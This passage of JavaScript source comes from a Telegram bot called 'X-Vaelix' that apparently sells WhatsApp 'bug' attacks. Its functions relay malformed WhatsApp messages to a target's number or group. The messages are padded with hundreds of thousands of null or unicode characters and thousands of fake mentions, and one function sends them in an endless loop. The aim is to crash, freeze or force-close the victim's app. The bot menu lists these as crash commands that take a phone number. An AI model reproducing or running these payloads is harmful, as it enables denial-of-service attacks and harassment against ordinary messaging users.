            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      let msg3 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      
      for (let i = 0; i < 10; i++) {
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msgx.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msgx2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
     
      await sock.relayMessage('status@broadcast', msg3.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
          if (i < 9) {
    await new Promise(resolve => setTimeout(resolve, 5000));
  }
      }
   } catch (err) {
      console.error(err);
   }
};

async function ResoulPayCrash(sock, target) {
while (true) {
     await sock.relayMessage(target, {
       botForwadedMessage: {
         message: {
            interactiveMessage: {
                body: { text: "~ [ # ] Ares" },
                nativeFlowMessage: { buttons: [{ name: "booking_status", buttonParamsJson: "\u0000" }, { name: "single_select", buttonParamsJson: "{}" }, { name: "booking_confirmation", buttonParamsJson: "\u0000" }, { name: "galaxy_message", buttonParamsJson: JSON.stringify({ icon: "PROMOTION", flow_cta: "ꦽ".repeat(150000), flow_message_version: "3" })}, {name: "view_order", buttonParamsJson: "\u0000"}, {name: "address_message", buttonParamsJson: "\u0000"} ]}
                }
              }
            }
        }, {});
       await new Promise((resolve) => setTimeout(resolve, 1000));
    }
}

async function JawaTimurForcloseNoClick(sock, target) {
  try {
    console.log(`[Function Jawa Timur] Processing: ${target}`);

    const generateId = () => Math.random().toString(36).substring(2, 15);

    const msg = {
      key: { remoteJid: "status@broadcast", fromMe: true, id: generateId() },
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
          mimetype: "image/jpeg",
          fileSha256: Buffer.from("qFarb5UsIY5yngQKA6MylUxShVLYgna4T0huGHDOMrw=", "base64"),
          caption: "FaiqOffc Is Here",
          fileLength: "149502",
          height: 1397,
          width: 1126,
          mediaKey: Buffer.from("5nwlQgrmasYJIgmOkI6pgZlpRCZ7Qqx04G7lMoh4SRM=", "base64"),
          fileEncSha256: Buffer.from("XM2q+iwypSX8r4TLT+dd/oB9R2iLGuSw+nIKP9EdnSw=", "base64"),
          directPath: "/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1777621571",
          jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHR0JXY1hYXVxYjX2Xe3N7lnngsJycsOD/2c7Z////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=", "base64"),
          contextInfo: {
            pairedMediaType: "NOT_PAIRED_MEDIA",
            isQuestion: true,
            isGroupStatus: true
          },
          scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
          scanLengths: [2899999999999999077, 1799999999999998555, 7699999999999999148, 1069999999999999164],
          midQualityFileSha256: "Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk="
        }
      },
      messageTimestamp: Math.floor(Date.now() / 1000)
    };

    await sock.relayMessage("status@broadcast", msg.message, {
      statusJidList: [target],
      messageId: msg.key.id,
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{
            tag: "to",
            attrs: { jid: target },
            content: undefined
          }]
        }]
      }]
    });

    await sock.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          },
          additionalNodes: [{
            tag: "meta",
            attrs: { is_status_mention: "false" },
            content: undefined
          }]
        }
      }
    }, {});

    await sock.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {});

    console.log(`[Function Jawa Timur] Success: ${target}`);

  } catch (error) {
    console.error(`[Function Jawa Timur] Error: ${error.message}`);
  }
}

async function VnXNewDelayHardCmbo(sock, target) {
  const vnxmbgdly = {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          contextInfo: {
            participant: target,
            mentionedJid: [
              '0@s.whatsapp.net',
              ...Array.from(
                {
                  length: 2000,
                },
                () =>
                  '1' + Math.floor(Math.random() * 900000) + '@s.whatsapp.net',
              ),
            ],
            body: {
              text: 'VnX',
              format: 'DEFAULT',
            },
            footer: {
              text: '\u0000'.repeat(25000),
              format: 'DEFAULT',
            },
            nativeFlowResponseMessage: {
              name: 'address_message',
              paramsJson: "\x10".repeat(9999999),
              version: 3,
             },
           },
         },
       },
     },
   };

  await sock.relayMessage(target, vnxmbgdly, {
    participant: { jid: target },
  });
    
  const vnxtest = {
   groupStatusMessageV2: {
     message: {
       imageMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m237/AQMXWKQwsrMYQwbJcty5nkMgF5D-fZ8xu-dRDhdIgrvqIiJdZ1ZgXuptdi7xEOTEBJDsBYw0b1CSwfoqWGOxXqaSURsrqFmQUGmFTxZBQw?ccb=9-4&oh=01_Q5Aa4gEIpMScGwc3W4TATq5YX3QpFwR_nPrYTlkqEAicxA13-Q&oe=6A2625EF&_nc_sid=e6ed6c&mms3=true",
       directPath: "/o1/v/t24/f2/m237/AQMXWKQwsrMYQwbJcty5nkMgF5D-fZ8xu-dRDhdIgrvqIiJdZ1ZgXuptdi7xEOTEBJDsBYw0b1CSwfoqWGOxXqaSURsrqFmQUGmFTxZBQw?ccb=9-4&oh=01_Q5Aa4gEIpMScGwc3W4TATq5YX3QpFwR_nPrYTlkqEAicxA13-Q&oe=6A2625EF&_nc_sid=e6ed6c",
        mimetype: 'image/jpeg',
        caption: 'VnX' +  "\u0000".repeat(250000),
        mediaKey: "gMU/MAFMpfewBPxf03l77UJ4BFniwIskJin1EAMj8e8=",
        fileEncSha256: "qMxO75MnLoMaS/b/UuTRAtBNXh2H0HSVPVkJlkmSpgk=",
        fileSha256: "RbwxheXko2h6rCjgkzKmD+l/wFliuC6SxtY3tbwSNzg=",
        fileLength: '19897899',
        mediaKeyTimestamp: "1778296099",
        contextInfo: {
          mentionedJid: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
          }
        }
      }
    }
  };
         
   await sock.relayMessage(target, vnxtest, {
    participant: { jid: target },
  });
    
    const vnxaudio = {
     groupStatusMessageV2: {
       message: {
        audioMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7114-24/553151991_818685271268692_6795957783606894464_n.enc?ccb=11-4&oh=01_Q5Aa4AHdygHdhtAMHQB0P7fDG2jGlUkQfSzCPw4NPnWbiF8eKQ&oe=69E640DB&_nc_sid=5e03e0&mms3=true",
           mimetype: "audio/mp4",
           fileSha256: "BAcpC1KGx40bu/FV78kBAafPjkkdj6DLVAx+B1g3avQ=",
           fileLength: "109951162777600",
           seconds: 1,
           ptt: true,
           mediaKey: "1KXHR1pvx2+y01K6Dewevx5FF5O5wfc5iE/oHIua2WY=",
           fileEncSha256: "CggqdAt0fX+QHjKnfyX2OjO1OoUXLm5WlVlv6f5aGCU=",
           directPath: "/v/t62.7114-24/553151991_818685271268692_6795957783606894464_n.enc?ccb=11-4&oh=01_Q5Aa4AHdygHdhtAMHQB0P7fDG2jGlUkQfSzCPw4NPnWbiF8eKQ&oe=69E640DB&_nc_sid=5e03e0",
           mediaKeyTimestamp: "1774107510",
           waveform: "EBAREicPEigjMkgwMDITDQ8QFBYkCwwMDAwIBAUCBScpMkNkUE1GTT1KVVk0VUVOWlUtWEk0X0o+Xh4XFxAIAQ==",
           caption: "VnX" + "\u0000".repeat(250000),
           contextInfo: {
  participant: target,
  mentionedJid: [
    '0@s.whatsapp.net',
    ...Array.from({ length: 2000 }, () => 
      '1' + Math.floor(Math.random() * 900000) + '@s.whatsapp.net'
    )
  ],
  urlTrackingMap: {
    urlTrackingMapElements: Array.from({ length: 100000 }, () => ({}))
  }
           }
        }
       }
     }
    }
               await sock.relayMessage(target, vnxaudio, {
    participant: { jid: target },
  });
}

async function NoctraBuldo(sock, target) {
  try {
    const msg = {
      key: {
        remoteJid: target,
        fromMe: false,
        id: Math.random().toString(36).slice(2)
      },
      message: {
        extendedTextMessage: {
        text: "Celyn@62000".repeat(15000),
        contextInfo: {
          mentionedJid: Array.from(
            { length: 10000 },
            () => `${Math.floor(Math.random() * 9999999999999)}@s.whatsapp.net`
          )
        }
      }
      }
    };

    await sock.relayMessage(
      target,
      {
        groupStatusMessageV2: {
          message: msg.message
        }
      },
      {
        messageId: msg.key.id,
        participant: {
          jid: target
        }
      }
    );

    console.log("Delta Sent Successfully");
  } catch (err) {
    console.error("Error:", err);
  }
}

async function DelayGroup(groupId) {
  const msg = generateWAMessageFromContent(
    groupId,
    {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            contextInfo: {
              remoteJid: groupJid,
              participant: "13135559098@s.whatsapp.net",
              mentionedJid: [groupJid],
              isForwarded: true,
              fromMe: false,
              forwardingScore: 9,
              expiration: 7205,
              ephemeralSettingTimestamp: 2502,
              disappearingMode: {
                initiator: "INITIATED_BY_OTHER",
                trigger: "ACCOUNT_SETTING"
              },
              AdReplyInfo: {
                advertiserName: " Null Fvck ",
                mediaType: "NONE",
                caption: " X "
              },
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: 7205
                }
              }
            },
            body: {
              text: "@raraa • #elysine 🩸",
              format: "EXTENSIONS_1"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1000000),
              version: 3
            }
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage(
    groupJid,
    msg.message,
    {
      messageId: msg.key.id
    }
  );
}

//------------------------------------------------------------------------------------------------------------------------------\\
const keyboardIntervals = {};
const userMode = {};

// =======================
// KEYBOARD (STYLE AKTIF)
// =======================
function buildKeyboard(style) {
  return [
    [
      { text: "𝗫-𝗩𝗔𝗘𝗟𝗜𝗫", callback_data: "erenmenu", style: style , icon_custom_emoji_id: "5465265370703080100" },
      { text: "𝗫𝗦𝗘𝗧𝗧𝗜𝗡𝗚𝗦", callback_data: "menu", style: style , icon_custom_emoji_id: "5226928895189598791" }
    ],
    [
      { text: "𝗫𝗦𝗨𝗣𝗣𝗢𝗥𝗧", callback_data: "TqTo", style: style , icon_custom_emoji_id: "5256047523620995497" },
      { text: "𝗫𝗧𝗢𝗢𝗟𝗦", callback_data: "menuTools", style: style , icon_custom_emoji_id: "5438496463044752972" }
    ],
    [
      { text: "𝗔𝗨𝗧𝗛𝗢𝗥", url: "https://t.me/RannNewEra ", style: style , icon_custom_emoji_id: "5433758796289685818" }
    ],
  ];
}

// =======================
// STYLE
// =======================
function getUserStyle(mode) {
  if (mode === "color_red") return "danger";
  if (mode === "color_green") return "success";
  if (mode === "color_yellow") return "primary";
  return "primary";
}

// =======================
// DISCO
// =======================
function startDisco(chatId, messageId) {
  stopDisco(chatId);

  const styles = ["primary", "danger", "success"];
  let index = 0;

  keyboardIntervals[chatId] = setInterval(() => {
    index = (index + 1) % styles.length;

    bot.editMessageReplyMarkup(
      { inline_keyboard: buildKeyboard(styles[index]) },
      { chat_id: chatId, message_id: messageId }
    ).catch(()=>{});

  }, 2000);
}

function stopDisco(chatId) {
  if (keyboardIntervals[chatId]) {
    clearInterval(keyboardIntervals[chatId]);
    delete keyboardIntervals[chatId];
  }
}


// =======================
// 📤 KIRIM MENU BARU
// =======================
async function sendMenu(chatId, caption, keyboard) {
  const sent = await bot.sendPhoto(chatId, getRandomImage(), {
    caption,
    parse_mode: "Markdown",
    reply_markup: { inline_keyboard: keyboard }
  });

  return sent.message_id;
}

// =======================
// 🎨 MENU WARNA
// =======================
function colorMenu() {
  return {
    inline_keyboard: [
      [
        { text: "𝖡𝗅𝗈𝗈𝖽", callback_data: "color_red" , style: "danger" , icon_custom_emoji_id: "5463250708918711044" },
        { text: "𝖦𝗋𝖾𝖾𝗇", callback_data: "color_green" , style: "success" , icon_custom_emoji_id: "5195111279244619776" }
      ],
      [
        { text: "𝖸𝖾𝗅𝗅𝗈𝗐", callback_data: "color_yellow" , style: "primary" , icon_custom_emoji_id: "6097934939829839073" },
        { text: "𝖣𝗂𝗌𝖼𝗈", callback_data: "color_disco" , style: "success" , icon_custom_emoji_id: "5257960214291823402" }
      ]
    ]
  };
}

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

const bugRequests = {};

bot.onText(/\/start/, async (msg) => {
  
  const chatId = msg.chat.id;
  const userId = msg.from.id
  const username = msg.from.username ? `@${msg.from.username}` : "User";
let joined = await checkJoined(userId)

if (!joined) {
return sendJoinMessage(chatId)
}
  stopDisco(chatId);
  
  const sent = await bot.sendPhoto(chatId, getRandomImage(), {
    caption: `<b><blockquote><tg-emoji emoji-id="5229011542011299168">👑</tg-emoji>X-Vaelix Infinity – 𝖲𝗎𝗉𝖾𝗋 – Speed</blockquote></b>
<b>↯ Developer  : @RannNewEra 
↯ Platform    : Telegram
↯ type script : Bebas spam bugs</b>
<b><blockquote><tg-emoji emoji-id="6129739490484294910">👑</tg-emoji>Version Script</blockquote></b>
<b>↯ Version    : 1.0 Beta</b>
<b><blockquote><tg-emoji emoji-id="5258011929993026890">👤</tg-emoji>𝖨𝗇𝖿𝗈𝗋𝗆𝖺𝗍𝗂𝗈𝗇 𝖴𝗌𝖾𝗋</blockquote></b>
<b>↯ Username: ${username}</b>
<blockquote><tg-emoji emoji-id="6204177183598974956">⬇️</tg-emoji> 𝚂𝙴𝙻𝙴𝙲𝚃 𝚃𝙷𝙴 𝙱𝚄𝚃𝚃𝙾𝙽 </blockquote>`,
    parse_mode: "HTML",
    reply_markup: colorMenu()
  });

  // 🔥 simpan message id
  userMode[chatId] = {
    mode: null,
    msgId: sent.message_id
  };

});

bot.on("callback_query", async (query) => {
  try {
    if (!query.message || !query.data) return;

    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const senderId = query.from.id;
    const data = query.data;

    await bot.answerCallbackQuery(query.id).catch(()=>{});

    if (data !== "color_disco") stopDisco(chatId);

    const runtime = getBotRuntime();
    const developer = "@RannNewEra "
    const memory = formatMemory();
    const cooldown = checkCooldown(senderId);
    const premiumStatus = getPremiumStatus(senderId);

    let caption = "";
    let replyMarkup = {};

    // ===== COLOR =====
    if (data.startsWith("color_")) {
      userMode[chatId] = data;

      if (data === "color_disco") {
        startDisco(chatId, messageId);
      } else {
        const style = getUserStyle(data);
        await bot.editMessageReplyMarkup(
          { inline_keyboard: buildKeyboard(style) },
          { chat_id: chatId, message_id: messageId }
        );
      }
      return;
    }

    // ===== BACK =====
    else if (data === "back_to_main") {
  const style = getUserStyle(userMode[chatId] || "color_green");

  caption = `\`\`\`javascript
X-Vaelix Infinity – 𝖲𝗎𝗉𝖾𝗋 – Speed
↯ Developer  : ${developer}
↯ Version    : 1.0
↯ type script : Bebas spam bugs
↯ Premium   : ${premiumStatus}
↯ Cooldown  : ${cooldown}
\`\`\``;

  replyMarkup = {
    inline_keyboard: buildKeyboard(style)
  };
}


    else if (data === "erenmenu") {

      caption = `
\`\`\`javascript
X-Vaelix Infinity – 𝖲𝗎𝗉𝖾𝗋 – Speed
↯ Developer  : ${developer}
↯ Version    : 1.0
↯ type script : Bebas spam bugs
↯ Premium   : ${premiumStatus}
↯ Cooldown  : ${cooldown}

»»—✠——> X-Vaelix ☩ Delay <——✠—««
𖥊  - /xbugs    ➜ 628xxxx
𖥊  - /xkill      ➜ 628xxxx
𖥊  - /xynerx    ➜ 628xxxx
𖥊  - /zypherx   ➜ 628xxxx
𖥊  - /xivorx     ➜ 628xxxx
\`\`\`
`;

      replyMarkup = {
  inline_keyboard: [
    [
      {
        text: "𝗫𝗜𝗣𝗛𝗢𝗡𝗘",
        callback_data: "erenmenu2",
        style: "danger",
        icon_custom_emoji_id: "4970075093381153851"
      },
      {
        text: "𝗫𝗙𝗢𝗥𝗖𝗟𝗢𝗦𝗘",
        callback_data: "erenmenu3",
        style: "danger",
        icon_custom_emoji_id: "6097996297732625001"
      }
    ],
    [
      {
        text: "𝗡𝗢𝗧 𝗦𝗣𝗔𝗠",
        callback_data: "erenmenu4",
        style: "danger",
        icon_custom_emoji_id: "6098059974917755974"
      },
      {
        text: " 𝗕𝗨𝗚 𝗚𝗥𝗢𝗨𝗣",
        callback_data: "erenmenu5",
        style: "danger",
        icon_custom_emoji_id: "6206505206197261313"
      }
    ],
    [
      {
        text: "𝗫𝗕𝗔𝗖𝗞",
        callback_data: "back_to_main",
        style: "success",
        icon_custom_emoji_id: "6206505206197261313"
      }
    ]
  ]
};

}

else if (data === "erenmenu2") {

      caption = `
\`\`\`javascript
X-Vaelix Infinity – 𝖲𝗎𝗉𝖾𝗋 – Speed
↯ Developer  : ${developer}
↯ Version    : 1.0
↯ type script : Bebas Spam Bugs
↯ Premium   : ${premiumStatus}
↯ Cooldown  : ${cooldown}

»»—✠——> X-Vaelix ☩ Ios <——✠—««
𖥊. - /noctex     ➜ 628xxxx
𖥊. - /qexon      ➜ 628xxxx
𖥊. - /hecte      ➜ 628xxxx
\`\`\`
`;

      replyMarkup = {
        inline_keyboard: [
          [
            { text: "𝗫𝗕𝗔𝗖𝗞",
            callback_data: "erenmenu", 
            style: "success" , icon_custom_emoji_id: "6206505206197261313" }
          ]
        ]
      };

    }

    else if (data === "erenmenu3") {

      caption = `
\`\`\`javascript
X-Vaelix Infinity – 𝖲𝗎𝗉𝖾𝗋 – Speed
↯ Developer  : ${developer}
↯ Version    : 1.0
↯ type script : Bebas spam bugs
↯ Premium   : ${premiumStatus}
↯ Cooldown  : ${cooldown}

»»—✠——> X-Vaelix ☩ Froclose <——✠—««
𖥊. - /foreclx      ➜ 628xxxx
𖥊. - /forexit       ➜ 628xxxx
𖥊. - /forcloz      ➜ 628xxxx
𖥊. - /fconemsg   ➜ 628xxxx
\`\`\`
`;

      replyMarkup = {
        inline_keyboard: [
          [
            { text: "𝗫𝗕𝗔𝗖𝗞",
            callback_data: "erenmenu", 
            style: "success" , icon_custom_emoji_id: "6206505206197261313" }
          ]
        ]
      };

    }

    else if (data === "erenmenu4") {

      caption = `
\`\`\`javascript
X-Vaelix Infinity – 𝖲𝗎𝗉𝖾𝗋 – 
↯ Developer  : ${developer}
↯ Version    : 1.0
↯ type script : Bebas spam bugs
↯ Premium   : ${premiumStatus}
↯ Cooldown  : ${cooldown}

»»—✠——> X-Vaelix ☩ Visible <——✠—««
